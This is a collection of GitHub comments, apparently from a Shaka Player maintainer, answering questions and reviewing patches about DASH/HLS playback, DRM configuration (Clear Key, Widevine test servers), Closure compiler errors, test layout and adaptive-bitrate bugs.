v2.0.0.\n. The current language switching via configure() is immediate, so the role switching could be as well.\n. After further consideration, I think we should stop using configure() in this way.\nProposal:\n- Configuration of preferred languages will only affect initial selections when content is loaded.  Changing preferred languages during playback will affect the next piece of content to be loaded.  The configuration represents a user preference, so it does not make sense to use the same mechanism to change languages during playback.  Choosing a new language may be a temporary, manual decision and is not the same as changing a user's preferences.\n- New methods for language choices will be introduced in parallel to getTracks() and selectTrack().  Example: player.getLanguages('audio') or player.selectLanguage('audio', 'fr-CA') or player.selectLanguage('text', 'de', 'caption').  The role argument will be optional, and these APIs will be easy to hook up directly to language-related UI elements.\n- Changing languages will clear the buffer (so that the effect is immediate) but will not disable adaptation.\n- We will add language-related UI elements to our demo app controls to demonstrate how we would expect these methods to be used.\n@sanbornhnewyyz, thoughts?\n. @forbesjo, I think we made a mistake on that.  We are going to address it as part of #767.. I had a colleague try our support test page on iOS 10 preview, and it appears that it still does not have MSE support.  We'll keep our fingers crossed for iOS 11.  :-)\n. @Portmansa, does dashjs indeed play on iOS?  I haven't been able to make their demo page work on iOS at all.\ncaniuse.com reports that MediaSource is still not available on iOS 10.3: http://caniuse.com/#feat=mediasource\nJust searching quickly through dashjs source, I see that MediaPlayer's initialize() method fails if MediaSource is not present.  Further, the MediaSource check allows for a prefixed version called WebKitMediaSource.\nSo it would seem that the only way iOS could be supported in dashjs directly is if WebKitMediaSource were available on iOS.  I just checked both Safari & Chrome on iOS 10.3, and WebKitMediaSource is not defined.. iOS has a native HLS implementation.  Essentially, when you use HLS with dashjs, you aren't using dashjs for playback at all.. Shaka Player only uses MediaSource.  If you want to bypass MediaSource, then you don't need Shaka Player.  Just do something like video.src = '/foo.m3u8';.  I'm not sure what value Shaka Player could add in that scenario.. Sorry, we don't know anything.  Any authoritative answers about about future MSE support on iOS would have to come from Apple.\nHowever, we will support a fallback to iOS's native HLS support in #997.. Oh, and here are links to Apple's bug trackers if you are interested in talking to them:\nApple Bug Reporter: https://developer.apple.com/bug-reporting/\nWebKit BugZilla: https://bugs.webkit.org/. According to the DASH IF, your content does not contain video segments that cover the entire period.  To quote them:\n\nIt is not the player that must deal with the problematic section but the production software.\nThe player should play the entire period from start to finish. It is the responsibility of the mechanism creating the DASH presentation to ensure that there is enough data in all the elementary streams to cover the entire duration of the period.\n\nShaka v1 had a complex mechanism whereby we effectively clipped off leading audio or video and treated the content as if it started when both streams were present.  Shaka v2 does not have this mechanism because it was complex and subtle and only served to hide bugs in content packagers.\nPlease report this bug to the vendor of your encoder or DASH packager.\n. @mohitYogi I will need access to the content to help you debug this.  Your manifest references oggy_audio_dashinit.mp4 and oggy_encrypt_video_dashinit.mp4, but these are not present in the zip file.\nCan you provide these files as an attachment or as a publicly accessible URL?  Either would work equally well for me.\n. If I recall correctly, IE 11 does not support Clear Key at all.  Only Chrome, Opera, and Firefox support Clear Key at the moment.\nThere is a simple fix for your sample code.  In addition to the kid and k fields, you need to add kty: 'oct' to your JSON web keys.  This is required by the Clear Key CDM in more recent versions of Chrome.\nIn Shaka v2, we offer a simplified clearkey configuration interface to help you avoid details like this.  Check out the \"Clear Key\" section of v2's DRM Configuration tutorial if you're interested.\nLet us know if we can do anything else to help.\n. Take the sample code you sent me and modify this:\njs\nvar keyObj = {\n  kid: Uint8ArrayUtils.toBase64(keyid,false),\n  k: Uint8ArrayUtils.toBase64(key,false)\n};\nto this:\njs\nvar keyObj = {\n  kty: 'oct',\n  kid: Uint8ArrayUtils.toBase64(keyid,false),\n  k: Uint8ArrayUtils.toBase64(key,false)\n};\nThat solves the InvalidAccessError.  But you are right, your content still does not play.  If you open chrome://media-internals and find the player instance that matches your video.src, you can see logs of what Chrome's media pipeline is doing.  For me, it has lots of errors decoding your audio:\nDropping audio frame which failed decode with timestamp: 0 us, duration: 23219 us, packet size: 285 bytes\nDropping audio frame which failed decode with timestamp: 23219 us, duration: 23219 us, packet size: 286 bytes\nDropping audio frame which failed decode with timestamp: 46439 us, duration: 23219 us, packet size: 285 bytes\nDropping audio frame which failed decode with timestamp: 69659 us, duration: 23219 us, packet size: 291 bytes\nDropping audio frame which failed decode with timestamp: 92879 us, duration: 23219 us, packet size: 303 bytes\nHowever you encoded this content, it appears to be broken.  What packager did you use to create this?\n. @mohitYogi Please report the decode failures to Mp4Box.  You should include the repro case you sent me (the fixed version), along with instructions to use chrome://media-internals to see the decode errors from Chrome.\n. @mohitYogi  Please file a bug report with Mp4Box.  Chrome cannot decode your content, so this is not a bug in Shaka.  My best guess is that the content is encoded incorrectly, so you should report this bug to Mp4Box.\n. I believe this is the issue tracker for Mp4Box: https://github.com/gpac/gpac/issues\n. Different browsers have different decoders, and some decoders are more flexible and forgiving than others.\nThere's nothing wrong with using Mp4Box, and I'm sure that if there is a bug, they would probably like to know so they can fix it.  Or perhaps they have already fixed it and you will just need to upgrade.  All software benefits from good bug reports, so please consider filing a report.\nPersonally, I use ffmpeg to encode into various resolutions and Shaka Packager to package the content.  You may have better luck with those.  It is easy to compile ffmpeg with the wrong options or without the encoders you need, so be careful with that.\n. Good catch!  Please read CONTRIBUTING.md and follow the instructions.  You'll need to add yourself to CONTRIBUTORS and AUTHORS.\n. Looks good to me.  Thanks!\n. Thanks!\n. Thanks for the patch!  Were these caught by the new compiler in #421?\n. I recommend splitting this PR up.  Most of these changes are easy to accept (fixing semicolons, annotations, etc.), so we can go ahead and land those.  I don't think we are ready to land the new compiler, though, until we find a way to address the lint check errors, and that may take more time.\nIf we split up the PR, we can land the less controversial parts relatively quickly and avoid having to rebase those changes many times as we continue to push changes from our end.\n. Perhaps this needs a quick rebase?\n. I'm getting two failures on my Linux workstation, neither of which make any sense to me:\n```\nChecking the tests for type errors...\n/usr/local/google/home/joeyparrish/hacking/shaka/js/test/test/util/fake_media_source_engine.js:149: ERROR - mismatch of the bufferedAheadOf property type and the type of the property it overrides from superclass shaka.media.MediaSourceEngine\noriginal: function (this:shaka.media.MediaSourceEngine, string, number, number=): number\noverride: function (this:shaka.test.FakeMediaSourceEngine, ?, ?, ?): ?\nshaka.test.FakeMediaSourceEngine.prototype.bufferedAheadOf = function(\n^\n/usr/local/google/home/joeyparrish/hacking/shaka/js/test/test/util/memory_db_engine.js:52: ERROR - condition always evaluates to false\nleft : null\nright: null\n  return this.stores_ != null;\n         ^\n```\nI believe these are both compiler bugs.  The first is a failure to infer types in an override, even though they are identical.  The second is clearly not correct.  this.stores_ != null is obviously not always false.\n. Replacing this.stores_ != null with !!this.stores_ seems to work for the second failure.  It shouldn't be necessary, but it works.  Maybe do that with a // TODO: report closure-compiler bug.\nStill trying to figure out the FakeMediaSourceEngine failure, which the build bot seems not to have.  I think we could call the nondeterministic behavior a compiler bug, as well.\n. Looks like you can work around FakeMediaSourceEngine by adding explicit parameter and return annotations to bufferedAheadOf.  Again, something you shouldn't have to do.  Another TODO: report closure-compiler bug on that as well, please.\n. One more request: It looks like with the new compiler and these two changes, we now pass 'analyzerChecks'.  Would you please remove --jscomp_off=analyzerChecks from build/build.py?  Thanks!\n. Wow, that's crazy.  How about we sort the files in python before passing them to the compiler?\n. Sorting the files list in build_raw() fixed all the compiler errors for me.\n. I was honestly not familiar with --dependency_mode until I looked it up just now.\nWe should fix this through --dependency_mode.  Does --entry_point support a file full of requires?  If so, we can use shaka-player.uncompiled.js as the entry point, since this already has to list all the exported classes an app might use.\n. I double-checked, and as it should be, everything in lib/ has a goog.provide.\nThe testing code doesn't need dependency tracking, as we don't really compile it.  We just check it for type errors so we can catch more mistakes in our test code before they show up as test failures.\nWe can definitely also sort the files in python, though.\n. The tests are not compiled.  We run the compiler over them with --checks-only to catch mistakes early.\nThe test runner serves up all library code, uncompiled, followed by all test code.  It uses closure to bootstrap the library through shaka-player.uncompiled.js.  The Karma config controls everything.  See the \"files\" array in karma.conf.js.\n. Okay, let's discuss dependency mode in #465 as you suggested.  One more pass through the build bot, and then we'll merge this.\n. No problem.  Thank you for contributing!\n. When the context menu shows \"Back, Forward\", selecting \"Inspect\" reveals the cause: the cursor is on element ID giantPlayButtonContainer instead of video.\nThe actual button (ID giantPlayButton) has the style display: none, but its container has display: block, which is why the container is receiving those clicks.  We should be able to fix it by hiding the container.\n. Appears to have been fixed by pull #426.  Closing.\n. Sounds fairly easy.  We'll see if we can fit it into v2.0.0.  One change, though:  I'd prefer the member to be named \"channels\" instead of \"channelcount\".  Any objections?\n. Actually, now that we've looked into it, this is not so clear.  The DASH spec has some very confusing text about the meaning of the value attribute, and we can't convince ourselves that this is supposed to be the number of channels.  The spec text around this also refers to multiple other spec documents, one of which we don't currently have access to.\nBecause of all this, I am going to defer this enhancement.  We can look again after v2.0.0 is complete.  Sorry!\n. Sorry, I do not have an update.  I need to track down the relevant spec text again, as I have lost my notes on the topic.  This time, I will leave my notes on github.. @avelad, the interpretation of value depends on the scheme ID.  I will be publishing a more detailed plan soon.. Looks like this was addressed by PR #441, which was merged.  Closing.\n. Seth, I know you've sent us PRs before, so you must still have a CLA on file.  Make sure your commits have the correct author information that matches your CLA.  The CLA bot should recheck once you update the PR.\nTim, since you assigned #423 to yourself, can you please review the contents of the PR and then run it through the buildbot when you're happy with it?\n. I just checked your commit, and it's definitely the right author name and email.  I can also verify that your company has signed the corporate CLA, so there's no obvious reason the CLA bot should be unhappy.  Ignore for now, and I'll look into getting that fixed.\n. I've been advised to ignore the CLA bot in this particular case.  I've manually verified that your company has signed the appropriate agreement.\n. Did you run ./build/test.py ?\n. It appears that only some of the tests are running now (integration tests + utils).  You will need to update karma.conf.js to match, as that has glob patterns for all the test files that need to be served.\nAlso, there is a problem with some of your renaming.  Because you put tests for lib/utils/ into test/utils/, you now have test utilities (previous contents of test/utils) mixed with tests of utilities.  The order in which test code gets loaded by karma is important.  Here's a snippet:\n``` js\n    files: [\n      // closure base first\n      'third_party/closure/goog/base.js',\n  // deps next\n  'dist/deps.js',\n  'shaka-player.uncompiled.js',\n\n  // requirejs next\n  'node_modules/requirejs/require.js',\n\n  // test utils next\n  'test/util/*.js',\n\n  // list of test assets next\n  'demo/assets.js',\n\n  // support test before other tests\n  'test/support_check.js',\n\n  // unit tests last\n  'test/*_unit.js',\n],\n\n```\nBy combining things in test/util/, this strict ordering is no longer possible.\n. Please keep lib/util as is.  We don't want to change the namespace of library code, and we want the folders to match the namespaces.\nAlso, you can put the *_integration.js into subfolders as well.  No reason drm_engine_unit.js should be somewhere other than drm_engine_integration.js.\nYou could move test/assets, tests/externs, and test/util one level deeper to test/test.  This will require more changes in karma.conf.js, as well as some changes in the tests which load from the assets folder at runtime.\n. Also, things are changing quickly right now, so you will have to rebase your change and fix conflicts at least once.\n. The nudge was required on older versions of Chromium.  They have since fixed the bug on their end, so we got rid of the nudge in Shaka v2.  Let me discuss with the team.  It may be cleaner to have you completely remove the nudge in a separate PR first.\n. Can you rebase on top of the other PR and resolve conflicts?\n. The Configuration tutorial is a good overview of how Player configuration works in general.  It introduces you to the concept of our config system and shows some of the defaults without really going into what they are for.\nNext, I suggest you read the DRM Configuration tutorial, which explains how to configure the Player for DRM content such as yours.  In a nutshell, you must provide a license server URL.\nThe License Server Authentication tutorial is a more advanced topic, specifically for license servers which require authentication.  Since you are packaging your own content against Widevine's UAT server, you can use Widevine's test license server which does not require authentication.  Unless you are specifically setting up your own server, you don't need the authentication tutorial.\nDoes that help?\n. The appspot license server you referenced is only used by the player to request a license.  The key server used by the packager is a different endpoint which speaks a different protocol.\nThe Shaka Packager project has instructions in its README file under the heading \"Driver Program Sample Usage\".  These options are the ones I use:\n--enable_widevine_encryption \\\n--key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" \\\n--content_id \"3031323334353637\" \\\n--signer \"widevine_test\" \\\n--aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" \\\n--aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\"\nIf you need further assistance with Shaka Packager, that project is maintained by a different team who can help you better than I can.  They have a public mailing list and github issue tracker.\nI'm not sure what to recommend for running a private license server.  I will ask my colleagues for guidance and reply here.\n. My colleagues have told me that to run a private license server, you should contact Widevine directly: http://www.widevine.com/contact.html\nPlease let us know if you have any other issues with Shaka Player.  Thanks!\n. Looks good to me.\n. I'm unable to reproduce on the nightly build: http://nightly.shaka-player-demo.appspot.com/demo/\nI started with adaptation disabled via the UI.  Then I started \"Sintel 4k (multicodec)\".  The resolution was 426x182.  I let it play for a bit, then enabled adaptation via the UI.  It switched resolutions several times after that in response to bandwidth estimates, hitting both 720p and 1080p.\nI also tried the other way.  I started with adaptation enabled via the UI.  Then I started \"Sintel 4k (multicodec)\".  The resolution adapted up to 1080p.  I then disabled adaptation by selecting 256x110 resolution.  Then I re-enabled adaptation via the UI.  It eventually switched resolution again, hitting both 720p and 1080p.\nThe problem might be here:\n\nExpected behavior would then be that the player enables ABR again and adapts in a short while\n\nCan you retest with a clip of at least several minutes and wait longer this time?  It could be that our default ABR manager is simply slower than you expected in certain conditions.  If so, we'll rename this issue and discuss ways we could improve responsiveness.\n. Interesting.  What Shaka version are you using?\n. It seems likely that there is some issue in shaka.abr.EwmaBandwidthEstimator.  Can you try changing some of the constants in that file to see if you get better results?\nIn particular, minDelayMs_ and minBytes_ affect which samples are used in the estimate.  Initial track selection is affected by defaultEstimate_ and minWeight_, which in turn affects the size of segments downloaded and therefore which samples are used.  So all four of those are worth tinkering with.\nI'm sorry that we don't have the environment necessary to reproduce this issue, but if you can find a change to those parameters that helps in your case, we can work from there to analyze the situation in a theoretical way.\n. The value of \"chosen\" at line 311 would be the lowest bitrate stream on the first pass through the loop.  The loop should continue, though, and look at all video streams in order of bandwidth from lowest to highest.  @BucherTomas, does this happen in your case?\nThe most recently chosen streams are cached so that the \"switch\" callback only happens when there are actual changes necessary.  segmentDownloaded() calls suggestStreams_.  suggestStreams_ calls chooseStreams_ to make a choice, then compares that choice to the cached values before calling switch_.  That's the only purpose of those cached values.\nOne thing that may be confusing the issue is that when we change bitrates, we don't currently clear the buffer at all.  So if you've buffered ahead 30 seconds of content at 240p, you won't see 1080p content in the buffer for 30 more seconds.  The streams chosen by SimpleAbrManager would be 1080p, streamsByType_ would show the 1080p stream, and the \"active\" track would be the 1080p track, but the content on screen at that moment would still be 240p.\nWe've been putting off changes to allow the AbrManager to clear the buffer when switching.  Assuming there's no race, that change would make upgrades take effect more quickly.\nOf course, there may also be a race somewhere.\nTo start, I will try to reduce the effect of buffering, because that is the simplest thing we can do.  After that, I will see if I can reproduce the race described by @Ross-cz.\n. I've got clear repro on this now.  Definitely a bug.  The key is enabling adaptation after the manager has enough data to justify a switch.\nAs soon as the config changes, shaka.Player.prototype.applyConfig_ asks SimplerAbrManager for new streams.  But applyConfig_ is filtering that set of streams for language changes and only sending those changes to StreamingEngine.\nAfter that, there's a mismatch between what SimpleAbrManager thinks it asked for and what has actually taken effect.  SimpleAbrManager doesn't call switch_() because it already asked for those streams, even though the initial request was filtered out.\nNot sure yet if the fix will be to Player or SimpleAbrManager, but we now understand the problem.\n. Also, thanks to both @BucherTomas and @Ross-cz for the detailed reports and for helping to debug.  Much obliged.\n. @BucherTomas and @Ross-cz, I believe we have this fixed now in master.  Can you please retest and confirm?\n. Excellent.  Thanks!\n. Yes, you are right.  Sorry for the trouble, but we will be releasing beta3 from master soon.\n. Sorry, Shaka doesn't have any influence at the decode level.  That is all inside Chrome.  It's possible that Chrome has changed decoders between Chrome 50 and 52.  You should check chrome://media-internals for specific decoder errors.  Look for the button that matches the value of video.src for the failed playback.  Chrome will usually say what the error was, and that can be a useful clue.  If you post the decoder logs, we can try to help you interpret them.\nIf you believe the content is completely valid and Chrome's complaint about it is a bug, please file a bug against Chromium with details and a link to the content itself.\nOtherwise, you should update to the latest version of your encoder/packager software and/or file a bug against the encoder/packager to generate more widely-compatible content.\nDoes this help?\n. It's odd that it doesn't have more information.  I'm used to seeing specific errors from media-internals.  I'm sure Chrome team can make a recommendation for better debugging.  chrome://media-internals is all I know.\n. The behavior you're describing is in the browser, not in Shaka.  You could file a bug against Chrome and add a link to that bug here, if you like, but there's nothing Shaka can do to control this detail of the browser's media pipeline.\nAs I understand it, Chrome's media pipeline on Android has historically been implemented differently from the pipeline on desktops, so this may explain why audio keeps going on those platforms.  That, at least, sounds like a bug to me.\nNot stopping audio and video at exactly the same time may be working as intended for Chrome, but I am only speculating.  Someone from Chrome's media team should be able to tell you more definitively what the intent is.\n. Exactly.  The browser has its own logic for when the pipeline stalls and playback is held up waiting for data.  Our 'buffering' event is fired when we first notice that we have too little data, which isn't tied to when the browser stalls.  Trying to detect browser pipeline stalls was difficult to do consistently across browsers.\nvideo.buffered as far as I know is the intersection of the buffered ranges of each SourceBuffer.  But I've seen browser pipelines stall when currentTime is less than buffered.end(0), and I've seen stalls when currentTime is actually greater than buffered.end(0).  So buffered is (counter-intuitively) not the best way to detect pipeline stalls.\n. As long as tracks are not changing, Shaka (in StreamingEngine) tracks the number of the segment it most recently downloaded.  It does not know every segment it has ever downloaded.\nStreamingEngine also has access to the buffered ranges of each SourceBuffer (through MediaSourceEngine), so it can know how much audio is buffered separate from how much video is buffered.\n. Are you sure that Safari is wrong about the timestamp?  I downloaded that TS segment and fed it to ffmpeg, and ffmpeg says it starts at 9.95:\nInput #0, mpegts, from 'fileSequence0.ts':\n  Duration: 00:00:10.02, start: 9.952111, bitrate: 1286 kb/s\nIs there any signalling in the HLS manifest that would let you know to expect this gap?\nIf your underlying media says \"10\", but you want it to be treated as \"0\" in MSE, you can set presentationTimeOffset: 10 in shakaExtern.Stream.  But you'd want to be able to deduce that value of 10 from the m3u8.\n. Hrm... that's tough.  Safari's native HLS implementation, since it's in the browser, probably has easy access to the media timestamps after decode and can apply the offset internally without the user or the content creator having to do anything.  We are not so lucky in JavaScript.\nYou could conceivably parse the first media segment in a response filter, but I think it would be preferable to avoid that.\nAlternatively, some part of the player could seek for you to the first buffered timestamp once content was buffered.  But it would still leave a dead gap of 10s in the beginning of the presentation timeline.  If we don't also update the seek range, the user could seek back to that gap, and playback would hang.\n. No, you're mistaken about multiple ranges.  In v1, we complained loudly about them because we had made many assumptions that the way we used MSE, they would never exist.  In v2, we tried to make fewer assumptions that would require a single range, but we still don't handle them explicitly (such as jumping over gaps).\nI wonder why one .ts segment would be buffered as multiple ranges.  I can't think of a good reason that would be valid or expected, but I'm not familiar with details of TS.\n. Thanks!  Can you link us to the Safari bug so we can follow along?\n. What browser are you using?  Is this reproducible in the nightly build of the demo app?  http://nightly.shaka-player-demo.appspot.com/demo/\n. The codebase may be the same, but I'm asking if you can reproduce it with our app.  If not, the cause may be in your own application code.\n. We don't have a demo for that, but you can put a custom manifest and license server URL into the demo app.  At the bottom of the list of assets is \"(custom asset)\".  Select that and boxes will appear to allow you to put in your own manifest and license server URLs.\nIt's not clear to me why seeking to the end would result in an exception.  As far as I know, no seek should be able to cause this.  But if you can reproduce it on the demo app, we will be much better able to diagnose it.\n. @Ross-cz, were you able to make any progress on this?  Is this still an issue for you?\n. Checking readyState seems fine in general, but I still can't reproduce your issue.\nPlease try again with the latest code from master or with the nightly build.  We're definitely handling expired licenses through key status events.  With the setup below, I get the error DRM.EXPIRED:\nAsset: http://storage.googleapis.com/shaka-demo-assets/sintel-widevine/dash.mpd\nLicense server: http://cwip-shaka-proxy.appspot.com/fastexpire\nFull demo: http://nightly.shaka-player-demo.appspot.com/demo/?asset=//storage.googleapis.com/shaka-demo-assets/sintel-widevine/dash.mpd;license=//cwip-shaka-proxy.appspot.com/fastexpire;play\n. @baconz, we've determined why the Google CLA bot doesn't like your PRs.  \"author: null\" at https://api.github.com/repos/google/shaka-player/pulls/442/commits indicates that the author in the commit author's email address doesn't map to a github account.  So just add your work email to your github account and the check should pass.  https://cla.developers.google.com/about#add-contributors\n. Yes, definitely looks unrelated.\n. Great.  We'll give it one more pass on the build bot before merging.\n. We should have a tutorial that focuses on this particular requirement, but we do have an API for this and it is documented.\nIf you look at the License Server Authentication tutorial, there's an example of registerRequestFilter().\nTo modify the URL for manifest requests, you would register a request filter, watch for type == shaka.net.NetworkingEngine.RequestType.MANIFEST, then modify the request.uris Array.  If there are multiple URIs in the array, NetworkingEngine will use them for fallback should one fail.\nThe request filter is synchronous, so you will need to either compute your signature in advance or be able to compute it synchronously in the filter callback.\nDoes this help?\n. Ah, you want to sign your segment URLs, not your manifest.  I misunderstood.  You can change the segment URLs by filtering for RequestType.SEGMENT.\nBut since you need to make an async call to generate the signatures, a request filter won't work for you.\nOne solution would be to modify NetworkingEngine to allow request filters to operate asynchronously.  For backward compatibility, a filter that is done could still return nothing.  But a filter returning a Promise would only be complete when the Promise was resolved.\nHowever, this would have you signing each segment right before it was requested, adding latency to each segment download while you wait for the round-trip to the signing server.  Does each segment require a different signature, or could you just make one signing request early on and use it for all segments in that manifest?\n. Your using the right API, but you may be selecting the wrong track.  Have you examined the value of getTracks()[0] in your console log?  My guess is that you aren't selecting 1080p, or possibly not even video.\nEven though 1080p is first in your manifest, that doesn't mean it's first in getTracks().  The list returned by getTracks() is all tracks, including audio and text.  Try something like\njs\nvar v1080 = player.getTracks().filter(function(t) {\n  return t.height == 1080;\n})[0];\n. Great.  Let us know if we can do anything to help.\n. Our README points to our users mailing list, which is meant for exactly these sorts of community discussions.  Github issues are more appropriate for tracking bugs and feature work.\n. Thanks for the report.  Probably has something to do with the MSE optimization we did as part of that change.  We'll take a look.\n. Clearing ahead is causing the hiccup.  On Chrome, Opera, and Firefox, the hiccup is fixed by calling abort() to reset the decoder.  On IE and Edge, the abort() call has no effect.  On Safari, the abort() call causes the decoder to fail completely.  :-(\n. @BucherTomas can you please retest with the latest code from master or with the nightly build on appspot?  We believe this is resolved now for Edge and IE11.\n. Please don't worry about Safari.  The Safari issue seems to be separate.\n. Yes, this is intended behavior.  The event fires when there's an automatic adaptation, but not a manual one.  Presumably, if you call the method to change tracks, you know you've called it.  Also, choosing a track manually disables ABR, so an adaptation event (which signals that the ABR system has made a decision) wouldn't make much sense.\nI can see, though, that the docs are not very clear on these points.  I will update them.\n. The docs have been updated.  Hope that helps!\n. I was able to reproduce on Edge with the nightly build.  What I found was an error 6007 (LICENSE_REQUEST_FAILED), with the data field set to an error 1002 (HTTP_ERROR).\nWhat this means is that the license request failed due to an HTTP error.  An HTTP error is distinct from error 1001 (BAD_HTTP_STATUS).  A bad HTTP status means the server returned something other than a 2xx status, but an HTTP error means the request failed without a status code being communicated to JavaScript through the XHR.\nError 1002 is typically caused by a CORS problem, and indeed, Edge's debug console shows the error message SEC7120: Origin http://nightly.shaka-player-demo.appspot.com not found in Access-Control-Allow-Origin header.\nI would advise you to make sure your CORS headers are correct and understood by Edge.\n. @pajong, @johnluther, were you able to resolve the CORS error?\n. @esboyd Any update?  Is there anything else you need from us on this, or can we close the issue?\n. Okay, well please feel free to reach out again if you need further support.\n. @torerikal mentioned that this fix was in their fork: vimond@adbcdb5\n@torerikal, @janouskovec, any interest in cleaning it up and creating a PR?\nI think it's a good start, but the subclass should call the base class's constructor instead of re-creating all of its members.  There also doesn't seem to be any need to make everything protected, just make urls non-const.\n. Okay, closing for lack of interest.  If anybody wants to patch v1 for this, please feel free to reply and we can reopen.\n. SMIL is not currently on our roadmap, but you are welcome to implement a manifest parser for SMIL.  All manifest parsers are plugins in v2, so it could even live at the application level if you are not interested in creating a PR.\n. Closing due to inactivity.  If this is something you are still interested in, let us know and we can discuss.. You shouldn't be trying to handle DRM events yourself if you're using Shaka Player.  (Listening for 'encrypted' and 'message' events, creating your own MediaKeys and sessions, etc.)  Shaka does all of that for you if you configure it correctly.\nTry following the DRM Configuration tutorial, particularly the \"Clear Key\" section.  Does that help?\n. @ljj7kr, is this still an issue for you, or can we close it?\n. Closing due to inactivity.\n. Marked as \"external bug\".  We'll track Firefox bug 1286685 for updates.\n. No worries.  Just make this part of the same PR with the new compiler itself.\n. I've got an alternate change in mind for this.  Please stand by.\n. Since shakaExtern.Stream is a typedef of a record type, it is already non-nullable by default, but there's nothing wrong with adding the exclamation point.\n. Yeah, sometimes Closure is more subtle than I would like.\n. Works for me, too.  But I notice that your fiddle also loads v2.0.0-beta2 from cdnjs.  The problem is not that it never adapts, but that it does not clear the data it has already buffered when it adapts to a higher resolution, so it may take a while to see the effect.\nWe fixed this in 6daa7f3b by clearing ahead of the playhead when adapting to a higher resolution.  Please try again with a new build from master to confirm.  The fix will appear in v2.0.0-beta3 release.\n. Great, thanks for letting us know.\n. Thanks!  Looks good to me.\n. This seems pretty reasonable, but I'd like to defer it until after we wrap up v2.0.0.\n. We have not scheduled this work.  A PR would be welcome, and I have no issues with the three-event design you laid out in the original post.  Thanks!. @baconz, are you working on this at the moment?  If not, I will try to schedule it for our team.. Confirmed.  Thanks for the report.\n. Bisect shows it was broken by ab865518.  @baconz as JFYI\n. No MPD?\n. Oh, you mean mediaPresentationDuration?  Yes, that's definitely allowed.  The presentation duration can be derived from period durations.\n. Your in-progress VOD content has a known, finite duration, correct?  And type=\"static\" or type=\"dynamic\"?  It would be helpful to have a public sample of such content we could use if this type of content is something we want to continue to support.\n. In my opinion, we have too many definitions of isLive now.  We used to have one source of this, in PresentationTimeline.\nWe need to step back and reassess what we're trying to represent and how.  I suspect that the term \"live\" has become overloaded and there are multiple concepts that need to be represented separately.\n. As discussed via email, we are pursuing a different fix.  Closing this PR for now.\n. \"Compiled\" in Closure means actually compiled.  The Closure compiler not only minifies and concatenates, but also takes into account type information, enforces type-safety, and applies compiler optimizations.\nIf you're installing from npm, the deps are already generated.  The real issue seems to be that you're using ES6 imports instead of script tags, which is honestly not something we anticipated.\nAs such, I'm renaming this issue as \"Support ES6 import in uncompiled mode\".  I'm not sure how we would do this off-hand, but we will keep it in mind when we start planning our next major release.  Thanks!\n. Please provide details on the error.  What's the error code you're seeing?\n. Yes, that is the error I wanted.  HTTP_ERROR is typically caused by a lack of CORS headers on your server.  Please read the CORS page at MDN for details.  If you don't have the right CORS HTTP headers on the resource, then the application cannot access the content from another domain.\n. @jjs1233, is this still an issue for you, or can we close it?\n. Closing due to inactivity.\n. There's no reason we couldn't parse that.  It looks like we're not parsing any of the optional parts of the individual settings.  Here's the relevant text from the spec, for reference:\nA WebVTT line cue setting consists of the following components, in the order given:\n1. The string \"line\" as the WebVTT cue setting name.\n2. A U+003A COLON character (:).\n3. As the WebVTT cue setting value:\n   1. An offset value, either:\n      1. To represent a specific offset relative to the video viewport, a WebVTT percentage.\n      2. Or to represent a line number\n         1. Optionally a U+002D HYPHEN-MINUS character (-).\n         2. One or more ASCII digits.\n   2. An optional alignment value consisting of the following components:\n      1. A U+002C COMMA character (,).\n      2. One of the following strings: \"start\", \"center\", \"end\"\nA WebVTT position cue setting consists of the following components, in the order given:\n1. The string \"position\" as the WebVTT cue setting name.\n2. A U+003A COLON character (:).\n3. As the WebVTT cue setting value:\n   1. A position value consisting of: a WebVTT percentage.\n   2. An optional alignment value consisting of:\n      1. A U+002C COMMA character (,).\n      2. One of the following strings: \"line-left\", \"center\", \"line-right\"\nhttps://w3c.github.io/webvtt/#cue-settings\nHowever, be forewarned Chrome has not yet implemented the positionAlign or lineAlign properties on the VTTCue interface, so those properties will not have any effect in the current version of Chrome.\n. @OrenMe, the Chromium authors have stated that these attributes were not implemented in Chromium because they didn't have a real use-case.  If you're interested to see these attributes implemented in Chrome, please go to the Chromium bug tracker and explain what you need: https://bugs.chromium.org/p/chromium/issues/detail?id=633690#c6\n. No reason we can't support both for now.\n. Tears of Steel (widevine) and Sintel 4k (widevine) are both playing fine for me on v2.0.0-beta2 and on the nightly build.\nWhat Android device do you have?  Is there an older version of Shaka Player that does work for you?\nHere are links to older versions to make it easier for you to test:\nnightly\nv2.0.0-beta2\nv2.0.0-beta\nv1.6.5\nv1.5.2\nv1.4.2\nv1.3.2\nv1.2.4\n. Widevine didn't become available to Android Chrome until Android 4.4, so those items are disabled on 4.2.2.  We query the browser to find out which key systems are supported and disable the assets that won't work.\n. I just tried two phones running Android 6.0 and I was unable to reproduce your issue on either of them.\nIt's curious that the nightly build disables the Widevine streams.  That only happens if Widevine is unavailable on the device.  It seems plausible that a previous build did not correctly disable those streams, but the nightly build does disable them because your device actually can't play them.\nWidevine is only available on official builds of Android from Google.  Do these devices run AOSP or Cyanogen or some other variant of Android?\n. In general, the seek range should end at the live edge and begin timeShiftBufferDepth before that.\nIt's been 9 months since that revision, so it's tough to say if your specific issue has been fixed.  A lot has changed, including a complete rewrite for v2.\nThe best thing you can do is check to see if your issue can be reproduced on our latest release or the nightly build.  You can use the \"(custom asset)\" selection to input your own manifest and license server URLs.\nI notice that the commit you referenced is from the v1.5 branch.  If you are not able to upgrade to v2, you can also try to reproduce in our most recent v1 release, v1.6.5.  Please note that we are not actively maintaining v1 right now, so please consider v2 if you can.\n. If you want to submit a PR to v1.6.x to backport the fix to v1, I would be happy to review it.  Otherwise, I suggest upgrading to v2.\nv2.0.0-beta3 is stable, but not yet complete.  We currently have 6 open enhancement issues in our v2.0.0 milestone.\n. Closing due to inactivity.\n. I'm sorry, this is working as intended.  It was never intended to jump gaps that browsers will not jump at play time.\nWould changing this solve a problem for you?  I'd be happy to discuss.\n. Since we don't have any direct way to know how large a gap any given browser will jump, we can't really treat that media as buffered.\nStreamingEngine only queries the buffered range when initializing or switching streams, though, so small gaps should not be a problem while streaming.  Once streaming begins, segments are fetched and appended in order without examining the buffered range.  If a gap can be jumped, it will, and StreamingEngine won't notice.\nWhere this breaks down is when you enter a buffering state (underflow).  We don't exit that buffering state until a certain amount is buffered.  Then we're checking the buffered range on an interval, and that condition may never be met due to the gap.\n. That's a good point.  We definitely shouldn't be re-requesting the same segment over and over.\nI don't see any reason we couldn't create a separate GAP_TOLERANCE constant in TimeRangesUtils, but give us some time to 